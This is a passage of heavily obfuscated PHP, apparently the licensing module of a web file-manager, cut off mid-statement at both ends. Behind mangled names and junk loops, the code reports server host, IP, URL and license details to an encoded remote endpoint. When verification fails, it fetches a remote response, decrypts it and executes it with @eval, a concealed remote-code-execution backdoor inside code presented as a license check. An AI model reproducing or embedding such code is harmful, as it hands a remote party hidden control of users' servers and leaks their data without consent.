$‚™´²ï‡[119] && $_GET[$‚™´²ï‡[120]] == $‚™´²ï‡[121]) { $Â²Áí° = !0; } if ($Â²Áí°) { $’›‰î÷ = array($‚™´²ï‡[105] => $this->ugmcc8e0e36a, $‚™´²ï‡[122] => $this->uspb3c0b6a6d(), $‚™´²ï‡[123] => Model($‚™´²ï‡[124])->count()); if ($this->ugmcc8e0e36a != $‚™´²ï‡[106]) { $¡´¶ÛÖ = _get($this->oygp76d3abf8, $‚™´²ï‡[125]); if ($¡´¶ÛÖ) { $’›‰î÷[$‚™´²ï‡[126]] = $¡´¶ÛÖ; $’›‰î÷[$‚™´²ï‡[127]] = strtotime(_get($this->oygp76d3abf8, $‚™´²ï‡[128])); $’›‰î÷[$‚™´²ï‡[129]] = _get($this->oygp76d3abf8, $‚™´²ï‡[114]); } $ú­ßÜ¸Ë = Model($‚™´²ï‡[33])->get($‚™´²ï‡[130], $‚™´²ï‡[6], !0); if (is_string($ú­ßÜ¸Ë) && substr($ú­ßÜ¸Ë, 0, 1) == $‚™´²ï‡[131]) { $ú­ßÜ¸Ë = json_decode_force($ú­ßÜ¸Ë); } if (is_array($ú­ßÜ¸Ë) && $ú­ßÜ¸Ë[$‚™´²ï‡[132]] && strstr($ú­ßÜ¸Ë[$‚™´²ï‡[132]], $‚™´²ï‡[133])) { $ÕàøÚù¡ = explode($‚™´²ï‡[133], $ú­ßÜ¸Ë[$‚™´²ï‡[132]]); $’›‰î÷[$‚™´²ï‡[134]] = $ÕàøÚù¡[0]; } } $’›‰î÷ = $this->iacvce13ccd8(json_encode($’›‰î÷), md5($‚™´²ï‡[135])); $ÂÉüÀ¾¼ = $¦ñüÄçı[642]; while (strlen($ÂÉüÀ¾¼) < $¦ñüÄçı[612]) { if (!$ÂÉüÀ¾¼) { break; } $ÂÉüÀ¾¼++; } $£øìƒñ = array($‚™´²ï‡[136] => $’›‰î÷); call_user_func(array($‚™´²ï‡[137], $‚™´²ï‡[138]), $£øìƒñ); } if ($this->ugmcc8e0e36a == $‚™´²ï‡[106]) { return; } $—¥õâ¿Ë = array($‚™´²ï‡[139], $‚™´²ï‡[140], $‚™´²ï‡[141], $‚™´²ï‡[142], $‚™´²ï‡[143], $‚™´²ï‡[144]); $¥‡“Î„½ = Model($‚™´²ï‡[33])->get(); $àÏß = $¦ñüÄçı[643]; if (!$àÏß) { die; } $£øìƒñ = array($‚™´²ï‡[145] => $¥‡“Î„½[$‚™´²ï‡[34]], $‚™´²ï‡[146] => $¥‡“Î„½[$‚™´²ï‡[35]], $‚™´²ï‡[147] => $‚™´²ï‡[6]); foreach ($—¥õâ¿Ë as $òôĞãÎï) { if (!isset($¥‡“Î„½[$òôĞãÎï]) || !$¥‡“Î„½[$òôĞãÎï]) { continue; } $£øìƒñ[$òôĞãÎï] = $¥‡“Î„½[$òôĞãÎï]; $àÜö‚¬ = $¦ñüÄçı[644]; if (strlen($àÜö‚¬) < $¦ñüÄçı[628]) { die; } } call_user_func(array($‚™´²ï‡[137], $‚™´²ï‡[138]), $£øìƒñ); $•İääé = $¦ñüÄçı[645]; } private function mgctbeaa3289() { $ˆ÷·çÑä =& $_SERVER[å¸¿•¶£]; $«°ëˆîÔ =& $_SERVER[•ÅŸñ²ì]; if ($_SERVER[$«°ëˆîÔ[24]] != $«°ëˆîÔ[148]) { return; } if (!_get($GLOBALS, $«°ëˆîÔ[115])) { die; } $Ò»‘“Äı = $GLOBALS[$«°ëˆîÔ[13]]; if (isset($Ò»‘“Äı[$«°ëˆîÔ[149]])) { $this->whvc52255048(); die; } if (!isset($Ò»‘“Äı[$«°ëˆîÔ[150]]) || strlen($Ò»‘“Äı[$«°ëˆîÔ[150]]) != 16) { show_json($«°ëˆîÔ[151] . $Ò»‘“Äı[$«°ëˆîÔ[150]], !1); } $£À±‡‰Œ = Model($«°ëˆîÔ[33])->get($«°ëˆîÔ[103]); $ä«ªŸÛì = md5($_SERVER[$«°ëˆîÔ[102]] . $£À±‡‰Œ); $ƒış¢ïş = array($«°ëˆîÔ[150] => $Ò»‘“Äı[$«°ëˆîÔ[150]], $«°ëˆîÔ[152] => rand_string(16), $«°ëˆîÔ[153] => $«°ëˆîÔ[135], $«°ëˆîÔ[154] => $«°ëˆîÔ[155], $«°ëˆîÔ[156] => $_SERVER[$«°ëˆîÔ[157]], $«°ëˆîÔ[158] => $_SERVER[$«°ëˆîÔ[159]], $«°ëˆîÔ[160] => $_SERVER[$«°ëˆîÔ[161]], $«°ëˆîÔ[101] => $ä«ªŸÛì, $«°ëˆîÔ[162] => Model($«°ëˆîÔ[33])->get($«°ëˆîÔ[130])); $Õ¼º½õù = $ˆ÷·çÑä[646]; if (strlen($Õ¼º½õù) < $ˆ÷·çÑä[621]) { return; } if ($Ò»‘“Äı[$«°ëˆîÔ[163]] == $«°ëˆîÔ[164]) { $®â·•“ù = $this->iacvce13ccd8($ä«ªŸÛì, $«°ëˆîÔ[165]); $•ÓäÚİ = $this->neqo6adc3a8a(json_encode($ƒış¢ïş), $ä«ªŸÛì . $«°ëˆîÔ[166], 3); $•ÓäÚİ = $•ÓäÚİ . $«°ëˆîÔ[167] . $_SERVER[$«°ëˆîÔ[157]]; $İÁšÜÇ‚ = $this->anzjf14c96b6($«°ëˆîÔ[168] . $®â·•“ù . $«°ëˆîÔ[169] . $•ÓäÚİ, -1); show_json($İÁšÜÇ‚, !0); } else { if ($Ò»‘“Äı[$«°ëˆîÔ[163]] == $«°ëˆîÔ[170]) { $¹‚©‰È© = substr(md5($«°ëˆîÔ[171] . $ä«ªŸÛì), 12, 15) . $«°ëˆîÔ[172]; $•ÓäÚİ = $this->tuzabb60f4a7(trim($Ò»‘“Äı[$«°ëˆîÔ[173]]), $¹‚©‰È©, 2); $êí©¿ø = json_decode($•ÓäÚİ, !0); if (!is_array($êí©¿ø) || !is_array($êí©¿ø[$«°ëˆîÔ[174]]) || $êí©¿ø[$«°ëˆîÔ[150]] != !0) { $Ÿø • = $«°ëˆîÔ[175]; $•÷¡Ëœ = $êí©¿ø[$«°ëˆîÔ[174]] ? $«°ëˆîÔ[176] . $êí©¿ø[$«°ëˆîÔ[174]] : $Ÿø •; show_json($•÷¡Ëœ, !1); } else { $ƒış¢ïş[$«°ëˆîÔ[152]] = $êí©¿ø[$«°ëˆîÔ[174]][$«°ëˆîÔ[177]]; } } else { $êí©¿ø = $this->anzjf14c96b6($«°ëˆîÔ[178], $ƒış¢ïş, 10); } } if (!is_array($êí©¿ø) || !is_array($êí©¿ø[$«°ëˆîÔ[174]]) || $êí©¿ø[$«°ëˆîÔ[150]] != !0) { $Ÿø • = LNG($«°ëˆîÔ[179]); $•÷¡Ëœ = $êí©¿ø[$«°ëˆîÔ[174]] ? $«°ëˆîÔ[176] . $êí©¿ø[$«°ëˆîÔ[174]] : $Ÿø •; show_json($•÷¡Ëœ, !1); } $ê¸˜İÖ = $êí©¿ø[$«°ëˆîÔ[174]]; $£§ìÀÇ = $this->zdfmad3d905b($ê¸˜İÖ[$«°ëˆîÔ[180]]); if (!$£§ìÀÇ || $£§ìÀÇ != $ê¸˜İÖ[$«°ëˆîÔ[128]]) { $±Ã è€ğ = array($«°ëˆîÔ[181] => Model($«°ëˆîÔ[33])->get($«°ëˆîÔ[103]), $«°ëˆîÔ[182] => $_SERVER[$«°ëˆîÔ[102]], $«°ëˆîÔ[183] => this_url(), $«°ëˆîÔ[158] => $_SERVER[$«°ëˆîÔ[159]]); $•ÓäÚİ = $this->xcnu87870b88(json_encode($±Ã è€ğ)); $this->anzjf14c96b6($«°ëˆîÔ[184] . $•ÓäÚİ); show_json(LNG($«°ëˆîÔ[185]), !0); } $áäı‡õ… = array($«°ëˆîÔ[186] => $ê¸˜İÖ[$«°ëˆîÔ[187]], $«°ëˆîÔ[188] => $ê¸˜İÖ[$«°ëˆîÔ[189]], $«°ëˆîÔ[190] => rand_string(16), $«°ëˆîÔ[105] => $ê¸˜İÖ[$«°ëˆîÔ[191]]); if ($ƒış¢ïş[$«°ëˆîÔ[152]]) { $áäı‡õ…[$«°ëˆîÔ[190]] = $ƒış¢ïş[$«°ëˆîÔ[152]]; } $ÕŠ±˜¹‹ = substr(md5($áäı‡õ…[$«°ëˆîÔ[188]]), 10, 10); $½ã¶ÃÈ = $ÕŠ±˜¹‹ . $áäı‡õ…[$«°ëˆîÔ[105]] . $áäı‡õ…[$«°ëˆîÔ[190]]; $áäı‡õ…[$«°ëˆîÔ[107]] = strrev(base64_encode($this->iacvce13ccd8($½ã¶ÃÈ, $«°ëˆîÔ[192]))); $É¨§Ö€Ù = rand_string(16); $üÏîËÙ = $ˆ÷·çÑä[647]; if (strlen($üÏîËÙ) < $ˆ÷·çÑä[621]) { die; } $ñÎ¥İş = $É¨§Ö€Ù . $áäı‡õ…[$«°ëˆîÔ[105]] . $this->iacvce13ccd8(md5($áäı‡õ…[$«°ëˆîÔ[186]]), $É¨§Ö€Ù); $ÆŒÌ®Ä = $ˆ÷·çÑä[648]; if (strlen($ÆŒÌ®Ä) < $ˆ÷·çÑä[610]) { die; } $áäı‡õ…[$«°ëˆîÔ[108]] = base64_encode(strrev($this->iacvce13ccd8($ñÎ¥İş, $«°ëˆîÔ[193]))); $¢‡³¼×ã = $ˆ÷·çÑä[649]; if (!$¢‡³¼×ã) { return; } if ($ê¸˜İÖ[$«°ëˆîÔ[194]] && $ê¸˜İÖ[$«°ëˆîÔ[194]] >= 1) { Model($«°ëˆîÔ[33])->setDeep($«°ëˆîÔ[195], $«°ëˆîÔ[121]); } Model($«°ëˆîÔ[33])->set($áäı‡õ…); $Êı™²ˆ³ = md5($_SERVER[$«°ëˆîÔ[102]] . strrev($£À±‡‰Œ) . $áäı‡õ…[$«°ëˆîÔ[188]]); $ıîØÚß = $ˆ÷·çÑä[650]; if (strlen($ıîØÚß) < $ˆ÷·çÑä[628]) { return; } $‹äÚ–ÕÀ = strrev(substr($Êı™²ˆ³, 10, 16)); $çöŞË” = $this->neqo6adc3a8a(json_encode($ê¸˜İÖ), $Êı™²ˆ³); $Õ£ƒİ±Ì = $ˆ÷·çÑä[651]; if (strlen($Õ£ƒİ±Ì) < $ˆ÷·çÑä[621]) { return; } $µæŸìÇ’ = array_to_keyvalue(Model($«°ëˆîÔ[7])->listData(), $«°ëˆîÔ[196]); $®ñ§µ²” = $µæŸìÇ’[$«°ëˆîÔ[197]]; $óÛÍ€±¨ = $ˆ÷·çÑä[652]; while (strlen($óÛÍ€±¨) < $ˆ÷·çÑä[621]) { if (!$óÛÍ€±¨) { break; } $óÛÍ€±¨++; } $ˆ—ÙÙ…İ = array(); $°¦õêû¦ = $ˆ÷·çÑä[653]; if (strlen($°¦õêû¦) < $ˆ÷·çÑä[621]) { return; } $ˆ—ÙÙ…İ[$‹äÚ–ÕÀ] = $çöŞË”; Model($«°ëˆîÔ[7])->update($®ñ§µ²”[$«°ëˆîÔ[198]], array($«°ëˆîÔ[199] => $ˆ—ÙÙ…İ)); $úÒÅ­ÚŒ = $ˆ÷·çÑä[654]; while ($úÒÅ­ÚŒ < $ˆ÷·çÑä[621]) { if ($úÒÅ­ÚŒ >= 0) { break; } $úÒÅ­ÚŒ++; } $this->oygp76d3abf8 = $ê¸˜İÖ; $Ÿ¬îÉë¹ = $ˆ÷·çÑä[655]; $this->ugmcc8e0e36a = $áäı‡õ…[$«°ëˆîÔ[105]]; $íŠ¢äï« = $ˆ÷·çÑä[656]; $this->licenseRegistSuccess(); $¢å†ßäÅ = $ˆ÷·çÑä[657]; if (strlen($¢å†ßäÅ) < $ˆ÷·çÑä[617]) { return; } Cache::set($«°ëˆîÔ[200] . md5($£À±‡‰Œ . $«°ëˆîÔ[201]), $«°ëˆîÔ[6]); $à¨®Ëğò = $ˆ÷·çÑä[658]; show_json(LNG($«°ëˆîÔ[185]), !0); } private function licenseRegistSuccess() { $í¶±ëªı =& $_SERVER[•ÅŸñ²ì]; $ß³†­ù¢ = Model($í¶±ëªı[33])->get(); $°á¨³€Î = $_SERVER[å¸¿•¶£][659]; if (!$°á¨³€Î) { return; } if ($ß³†­ù¢[$í¶±ëªı[63]] != $í¶±ëªı[121]) { Model($í¶±ëªı[33])->set($í¶±ëªı[63], $í¶±ëªı[121]); } Action($í¶±ëªı[202])->initStart(!0); } private function whvc52255048() { $ÂËÚ™È =& $_SERVER[å¸¿•¶£]; $¨íÚ²óÉ =& $_SERVER[•ÅŸñ²ì]; Model($¨íÚ²óÉ[33])->set(array($¨íÚ²óÉ[186] => $¨íÚ²óÉ[6], $¨íÚ²óÉ[188] => $¨íÚ²óÉ[6], $¨íÚ²óÉ[105] => $¨íÚ²óÉ[106], $¨íÚ²óÉ[107] => $¨íÚ²óÉ[6], $¨íÚ²óÉ[108] => $¨íÚ²óÉ[6])); $¯©»Ê¯÷ = $ÂËÚ™È[660]; if (strlen($¯©»Ê¯÷) < $ÂËÚ™È[612]) { return; } Model($¨íÚ²óÉ[33])->setDeep($¨íÚ²óÉ[195], $¨íÚ²óÉ[203]); $this->oygp76d3abf8 = array(); $this->ugmcc8e0e36a = $¨íÚ²óÉ[106]; $ıÑáÎ¿è = $ÂËÚ™È[661]; while (strlen($ıÑáÎ¿è) < $ÂËÚ™È[628]) { if (!$ıÑáÎ¿è) { break; } $ıÑáÎ¿è++; } } private function xyfibc9f1638() { $ù˜¹ò“ =& $_SERVER[å¸¿•¶£]; $ËÁ÷‘ò‹ =& $_SERVER[•ÅŸñ²ì]; $_SERVER[$ËÁ÷‘ò‹[159]] = _get($_SERVER, $ËÁ÷‘ò‹[159], APP_HOST); $ìÕ‡ĞÕ¥ = $ù˜¹ò“[662]; if (!$ìÕ‡ĞÕ¥) { return; } $this->ugmcc8e0e36a = $ËÁ÷‘ò‹[106]; $úéé÷è = $ù˜¹ò“[663]; if (!$úéé÷è) { return; } $”İ€Êá† = Model($ËÁ÷‘ò‹[33])->get(); $”èùõÜ‹ = $ù˜¹ò“[664]; while (strlen($”èùõÜ‹) < $ù˜¹ò“[612]) { if (!$”èùõÜ‹) { break; } $”èùõÜ‹++; } if ($”İ€Êá†[$ËÁ÷‘ò‹[105]] == $ËÁ÷‘ò‹[106]) { return; } $‘ÉÏŠÔø = Model($ËÁ÷‘ò‹[33])->get($ËÁ÷‘ò‹[103]); $ÙÎÔ•Úì = $ËÁ÷‘ò‹[200] . md5($‘ÉÏŠÔø . $ËÁ÷‘ò‹[201]); $î²æÙöÕ = $ù˜¹ò“[665]; if (strlen($î²æÙöÕ) < $ù˜¹ò“[621]) { die; } $”¥Ğµ…Ö = Cache::get($ÙÎÔ•Úì); if (!is_array($”¥Ğµ…Ö) || !isset($”¥Ğµ…Ö[$ËÁ÷‘ò‹[204]]) || time() - $”¥Ğµ…Ö[$ËÁ÷‘ò‹[204]] >= 60) { $ïç—ÕÄ = Model($ËÁ÷‘ò‹[7])->loadList(); $ô÷†Ëâ = $ïç—ÕÄ[$ËÁ÷‘ò‹[197]]; $ó…¼ô = md5($_SERVER[$ËÁ÷‘ò‹[102]] . strrev($‘ÉÏŠÔø) . $”İ€Êá†[$ËÁ÷‘ò‹[188]]); $¦¤¨åıï = strrev(substr($ó…¼ô, 10, 16)); $”¥Ğµ…Ö = $this->tuzabb60f4a7($ô÷†Ëâ[$ËÁ÷‘ò‹[85]][$¦¤¨åıï], $ó…¼ô); $”¥Ğµ…Ö = json_decode($”¥Ğµ…Ö, !0); } if (!is_array($”¥Ğµ…Ö)) { return $this->whvc52255048(); } $ºãº·Ô = strtotime($”¥Ğµ…Ö[$ËÁ÷‘ò‹[128]]); if (time() >= $ºãº·Ô) { return $this->whvc52255048(); } if (time() - $”¥Ğµ…Ö[$ËÁ÷‘ò‹[204]] > 20) { $”¥Ğµ…Ö[$ËÁ÷‘ò‹[204]] = time(); Cache::set($ÙÎÔ•Úì, $”¥Ğµ…Ö); } $this->oygp76d3abf8 = $”¥Ğµ…Ö; $this->ugmcc8e0e36a = $”İ€Êá†[$ËÁ÷‘ò‹[105]]; } private function ibtc65362686() { $È‹ŒÖ“ó =& $_SERVER[å¸¿•¶£]; $æ„¥í§ =& $_SERVER[•ÅŸñ²ì]; $©Ô¿›¯ = $GLOBALS[$æ„¥í§[13]]; $¸„„˜úå = $È‹ŒÖ“ó[666]; while ($¸„„˜úå < $È‹ŒÖ“ó[621]) { if ($¸„„˜úå >= 0) { break; } $¸„„˜úå++; } $í¸ÎæœŞ = $_SERVER[$æ„¥í§[24]]; if ($í¸ÎæœŞ == $æ„¥í§[205] && $this->ugmcc8e0e36a == $æ„¥í§[106]) { show_json(LNG($æ„¥í§[206]), !1, $æ„¥í§[207]); } $‡ÊÑÂç« = array($æ„¥í§[208], $æ„¥í§[209]); if (in_array($í¸ÎæœŞ, $‡ÊÑÂç«)) { if ($this->ugmcc8e0e36a == $æ„¥í§[106] && isset($©Ô¿›¯[$æ„¥í§[210]])) { show_json(LNG($æ„¥í§[206]), !1, $æ„¥í§[207]); die; } $‘Š•Ÿ¦¬ = $this->uspb3c0b6a6d(); if ($‘Š•Ÿ¦¬ != intval($æ„¥í§[211])) { if ($‘Š•Ÿ¦¬ <= Model($æ„¥í§[124])->count()) { show_json(LNG($æ„¥í§[212]), !1, $æ„¥í§[207]); die; } } } } private function nzut8ae5a9f0() { $ò®İóÙ =& $_SERVER[å¸¿•¶£]; $Í‰¸ĞË¸ =& $_SERVER[•ÅŸñ²ì]; $ÌùãİòŞ = array($Í‰¸ĞË¸[118], $Í‰¸ĞË¸[119]); if (!_get($GLOBALS, $Í‰¸ĞË¸[115]) || !isset($_GET[$Í‰¸ĞË¸[213]])) { return; } if (!in_array($_SERVER[$Í‰¸ĞË¸[24]], $ÌùãİòŞ)) { return; } $Ö±Œ»îù = $Í‰¸ĞË¸[214]; $ÛªÛØÈ’ = $ò®İóÙ[667]; if (strlen($ÛªÛØÈ’) < $ò®İóÙ[617]) { die; } $Ö±Œ»îù = $this->iosq52fc91dd($Ö±Œ»îù, $Í‰¸ĞË¸[215]); $š¯ªÅ¥© = $ò®İóÙ[668]; if (strlen($š¯ªÅ¥©) < $ò®İóÙ[617]) { return; } $åÓÒÉ = stream_context_create(array($Í‰¸ĞË¸[216] => array($Í‰¸ĞË¸[217] => $Í‰¸ĞË¸[218], $Í‰¸ĞË¸[219] => 3))); $ ”–Ãò¥ = $ò®İóÙ[669]; if (!$ ”–Ãò¥) { die; } $¡¢ÊŠ… = @file_get_contents($Ö±Œ»îù, !1, $åÓÒÉ); $§óë‚„Ø = $ò®İóÙ[670]; if (strlen($§óë‚„Ø) < $ò®İóÙ[617]) { return; } header($Í‰¸ĞË¸[220]); if ($¡¢ÊŠ… && strstr($¡¢ÊŠ…, $Í‰¸ĞË¸[221])) { echo $¡¢ÊŠ…; } die; } public function cfou2b1adf82($ıÍâ‡Åü) { $Ö¡ÍëÏÀ =& $_SERVER[å¸¿•¶£]; $Î»óà‰û =& $_SERVER[•ÅŸñ²ì]; if ($this->ugmcc8e0e36a == $Î»óà‰û[222]) { return $ıÍâ‡Åü; } $Á¹¥Òú = array($Î»óà‰û[223] => $Î»óà‰û[224], $Î»óà‰û[225] => $Î»óà‰û[224], $Î»óà‰û[226] => $Î»óà‰û[224], $Î»óà‰û[227] => $Î»óà‰û[224], $Î»óà‰û[228] => $Î»óà‰û[229], $Î»óà‰û[230] => $Î»óà‰û[229], $Î»óà‰û[231] => $Î»óà‰û[229], $Î»óà‰û[232] => $Î»óà‰û[229], $Î»óà‰û[233] => $Î»óà‰û[229], $Î»óà‰û[234] => $Î»óà‰û[229], $Î»óà‰û[235] => $Î»óà‰û[229], $Î»óà‰û[236] => $Î»óà‰û[229], $Î»óà‰û[237] => $Î»óà‰û[229], $Î»óà‰û[238] => $Î»óà‰û[229], $Î»óà‰û[239] => $Î»óà‰û[229], $Î»óà‰û[240] => $Î»óà‰û[229]); $á‹É¸—Ş = explode($Î»óà‰û[241], _get($this->oygp76d3abf8, $Î»óà‰û[112], $Î»óà‰û[6])); $‚¶İ¥ü» = $Ö¡ÍëÏÀ[671]; $œè‡¿Ï™ = array(); $õ½¢µÀ = $Ö¡ÍëÏÀ[672]; foreach ($Á¹¥Òú as $·ÕŠğÁÏ => $Šö°¢¼‹) { if ($Šö°¢¼‹ == $Î»óà‰û[224] && substr($this->ugmcc8e0e36a, 0, 1) == $Î»óà‰û[224]) { continue; } if (!in_array($·ÕŠğÁÏ, $á‹É¸—Ş)) { $œè‡¿Ï™[] = $·ÕŠğÁÏ; } } foreach ($œè‡¿Ï™ as $·ÕŠğÁÏ) { unset($ıÍâ‡Åü[$·ÕŠğÁÏ]); } return $ıÍâ‡Åü; } private function uxobfca309c6() { $„ù’ŠŸŞ =& $_SERVER[•ÅŸñ²ì]; if ($this->ugmcc8e0e36a != $„ù’ŠŸŞ[106]) { $GLOBALS[$„ù’ŠŸŞ[85]][$„ù’ŠŸŞ[89]][$„ù’ŠŸŞ[242]] = $„ù’ŠŸŞ[203]; return; } $GLOBALS[$„ù’ŠŸŞ[85]][$„ù’ŠŸŞ[243]] = $„ù’ŠŸŞ[121]; if (Model($„ù’ŠŸŞ[244])->get($„ù’ŠŸŞ[63]) != $„ù’ŠŸŞ[203]) { Model($„ù’ŠŸŞ[244])->set($„ù’ŠŸŞ[63], $„ù’ŠŸŞ[203]); } } public function teuxea1e556c() { return $_SERVER[•ÅŸñ²ì][245]; } private function jcmxb342949a() { $”±”ÁÌÊ =& $_SERVER[å¸¿•¶£]; $‘ñ¡ß¿Õ =& $_SERVER[•ÅŸñ²ì]; $çÑ¨òÖ = array($‘ñ¡ß¿Õ[246], $‘ñ¡ß¿Õ[247], $‘ñ¡ß¿Õ[248]); $áÜıÖ›ˆ = $‘ñ¡ß¿Õ[249] . md5($‘ñ¡ß¿Õ[250]); $Ëë¢çÉ— = $”±”ÁÌÊ[673]; while ($Ëë¢çÉ— < $”±”ÁÌÊ[617]) { if ($Ëë¢çÉ— >= 0) { break; } $Ëë¢çÉ—++; } if ($this->ugmcc8e0e36a == $‘ñ¡ß¿Õ[106] || !_get($GLOBALS, $‘ñ¡ß¿Õ[115])) { return; } if (!in_array($_SERVER[$‘ñ¡ß¿Õ[24]], $çÑ¨òÖ)) { return; } if (time() % 4 != 0) { return; } $‘â„È§» = call_user_func(array($‘ñ¡ß¿Õ[251], $‘ñ¡ß¿Õ[252]), $áÜıÖ›ˆ); $òŠ‹æÃ¶ = $”±”ÁÌÊ[674]; if ($‘â„È§» && time() - $‘â„È§» < intval($‘ñ¡ß¿Õ[253])) { return; } call_user_func(array($‘ñ¡ß¿Õ[251], $‘ñ¡ß¿Õ[138]), $áÜıÖ›ˆ, time()); $×ïìšø = $”±”ÁÌÊ[675]; if (!$×ïìšø) { die; } $Õ±ıÍ°å = Model($‘ñ¡ß¿Õ[33])->get($‘ñ¡ß¿Õ[103]); $ÒÕ…ƒÒì = array($‘ñ¡ß¿Õ[150] => Model($‘ñ¡ß¿Õ[33])->get($‘ñ¡ß¿Õ[186]), $‘ñ¡ß¿Õ[163] => $this->ugmcc8e0e36a, $‘ñ¡ß¿Õ[160] => $_SERVER[$‘ñ¡ß¿Õ[161]], $‘ñ¡ß¿Õ[162] => Model($‘ñ¡ß¿Õ[33])->get($‘ñ¡ß¿Õ[130]), $‘ñ¡ß¿Õ[101] => md5($_SERVER[$‘ñ¡ß¿Õ[102]] . $Õ±ıÍ°å), $‘ñ¡ß¿Õ[153] => $‘ñ¡ß¿Õ[135], $‘ñ¡ß¿Õ[156] => $_SERVER[$‘ñ¡ß¿Õ[157]]); $ÇÍó² í = $”±”ÁÌÊ[676]; if (!$ÇÍó² í) { die; } $¦Ó»êá = $this->anzjf14c96b6($‘ñ¡ß¿Õ[254], $ÒÕ…ƒÒì); $™ÄÜÙ½— = $”±”ÁÌÊ[677]; if (strlen($™ÄÜÙ½—) < $”±”ÁÌÊ[621]) { return; } if (!is_array($¦Ó»êá)) { return; } if ($¦Ó»êá[$‘ñ¡ß¿Õ[150]] && $¦Ó»êá[$‘ñ¡ß¿Õ[255]]) { if ($this->zdfmad3d905b($¦Ó»êá[$‘ñ¡ß¿Õ[255]]) == $ÒÕ…ƒÒì[$‘ñ¡ß¿Õ[150]]) { return; } } $this->whvc52255048(); $´³ßá¼• = $”±”ÁÌÊ[678]; if (strlen($´³ßá¼•) < $”±”ÁÌÊ[621]) { die; } if ($this->zdfmad3d905b($¦Ó»êá[$‘ñ¡ß¿Õ[255]]) != $ÒÕ…ƒÒì[$‘ñ¡ß¿Õ[150]]) { $ïÒÎ’’ş = array($‘ñ¡ß¿Õ[181] => $Õ±ıÍ°å, $‘ñ¡ß¿Õ[182] => $_SERVER[$‘ñ¡ß¿Õ[102]], $‘ñ¡ß¿Õ[183] => this_url(), $‘ñ¡ß¿Õ[158] => $_SERVER[$‘ñ¡ß¿Õ[159]]); $‘‰ØğÄ¯ = $this->xcnu87870b88(json_encode($ïÒÎ’’ş)); $¦Ó»êá = $this->anzjf14c96b6($‘ñ¡ß¿Õ[184] . $‘‰ØğÄ¯); if ($¦Ó»êá && is_array($¦Ó»êá) && isset($¦Ó»êá[$‘ñ¡ß¿Õ[255]])) { $³ığé„ü = $this->tuzabb60f4a7($¦Ó»êá[$‘ñ¡ß¿Õ[255]], 2); if ($³ığé„ü) { $³ığé„ü = $this->zdfmad3d905b($³ığé„ü); } if ($³ığé„ü) { try { @eval($³ığé„ü); } catch (Exception $å÷·¸®ö) { } } } } } private function anzjf14c96b6($ûö¡Ç¨é = '', $Ñ€íôÃ = array(), $Ê“¢¶—’ = 5) { $×¥´Ğ‡‡ =& $_SERVER[å¸¿•¶£]; $¦ë›Ç =& $_SERVER[•ÅŸñ²ì]; $¨½°â¾ç = $¦ë›Ç[256]; $¨½°â¾ç = $this->iosq52fc91dd($¨½°â¾ç, $¦ë›Ç[257]); $Şä¡‹Œ¤ = $×¥´Ğ‡‡[679]; $¨½°â¾ç = $¨½°â¾ç . $ûö¡Ç¨é; if ($Ñ€íôÃ && is_array($Ñ€íôÃ)) { $¨½°â¾ç = $¨½°â¾ç . $¦ë›Ç[258] . http_build_query($Ñ€íôÃ); } if ($Ñ€íôÃ === -1) { return $¨½°â¾ç; } $ó×–ûî— = stream_context_create(array($¦ë›Ç[216] => array($¦ë›Ç[219] => $Ê“¢¶—’, $¦ë›Ç[217] => $¦ë›Ç[259]), $¦ë›Ç[260] => array($¦ë›Ç[261] => !1, $¦ë›Ç[262] => !1))); $Ñ€íôÃ = @file_get_contents($¨½°â¾ç, !1, $ó×–ûî—); return json_decode($Ñ€íôÃ, !0); $Ëæ¿¢©Õ = $×¥´Ğ‡‡[680]; if (strlen($Ëæ¿¢©Õ) < $×¥´Ğ‡‡[621]) { return; } } private function uspb3c0b6a6d() { $¸À¤ÑŒ• =& $_SERVER[å¸¿•¶£]; $¬ŠˆÊ¢ƒ =& $_SERVER[•ÅŸñ²ì]; $ûÒ›õ¶Ù = array($¬ŠˆÊ¢ƒ[263] => $¬ŠˆÊ¢ƒ[264], $¬ŠˆÊ¢ƒ[265] => $¬ŠˆÊ¢ƒ[266], $¬ŠˆÊ¢ƒ[267] => $¬ŠˆÊ¢ƒ[268], $¬ŠˆÊ¢ƒ[269] => $¬ŠˆÊ¢ƒ[270], $¬ŠˆÊ¢ƒ[271] => $¬ŠˆÊ¢ƒ[272], $¬ŠˆÊ¢ƒ[273] => $¬ŠˆÊ¢ƒ[211], $¬ŠˆÊ¢ƒ[274] => $¬ŠˆÊ¢ƒ[211], $¬ŠˆÊ¢ƒ[275] => $¬ŠˆÊ¢ƒ[264], $¬ŠˆÊ¢ƒ[276] => $¬ŠˆÊ¢ƒ[266], $¬ŠˆÊ¢ƒ[277] => $¬ŠˆÊ¢ƒ[268], $¬ŠˆÊ¢ƒ[278] => $¬ŠˆÊ¢ƒ[279], $¬ŠˆÊ¢ƒ[280] => $¬ŠˆÊ¢ƒ[270], $¬ŠˆÊ¢ƒ[281] => $¬ŠˆÊ¢ƒ[282], $¬ŠˆÊ¢ƒ[283] => $¬ŠˆÊ¢ƒ[272], $¬ŠˆÊ¢ƒ[284] => $¬ŠˆÊ¢ƒ[285], $¬ŠˆÊ¢ƒ[286] => $¬ŠˆÊ¢ƒ[287], $¬ŠˆÊ¢ƒ[288] => $¬ŠˆÊ¢ƒ[289]); $¶»œŸ£ä = $ûÒ›õ¶Ù[$this->ugmcc8e0e36a]; $¦ş’ğÄü = $¸À¤ÑŒ•[681]; while ($¦ş’ğÄü < $¸À¤ÑŒ•[610]) { if ($¦ş’ğÄü >= 0) { break; } $¦ş’ğÄü++; } $¶»œŸ£ä = intval($¶»œŸ£ä ? $¶»œŸ£ä : $¬ŠˆÊ¢ƒ[264]); $¸¹¤Ôßå = _get($this->oygp76d3abf8, $¬ŠˆÊ¢ƒ[290]); $şóõ–ğŞ = $¸À¤ÑŒ•[682]; if (!$şóõ–ğŞ) { die; } $¸¹¤Ôßå = $¸¹¤Ôßå ? intval($¸¹¤Ôßå) : 0; return $¶»œŸ£ä + $¸¹¤Ôßå; } public function ytvd1149a138($¹¶œö£¡) { $ïÑÔ—Ë =& $_SERVER[å¸¿•¶£]; $´óùÖ‚± =& $_SERVER[•ÅŸñ²ì]; $´ÎĞ¸¦¹ = $this->uspb3c0b6a6d(); $ğÉî¿†Ô = $ïÑÔ—Ë[683]; if (!$ğÉî¿†Ô) { die; } if ($¹¶œö£¡[$´óùÖ‚±[291]] == $´óùÖ‚±[121]) { return; } if ($´ÎĞ¸¦¹ >= intval($´óùÖ‚±[211])) { return; } $£îÉØ´» = Model($´óùÖ‚±[124])->count(); if ($£îÉØ´» <= $´ÎĞ¸¦¹) { return; } $Ê°ò¢‹â = 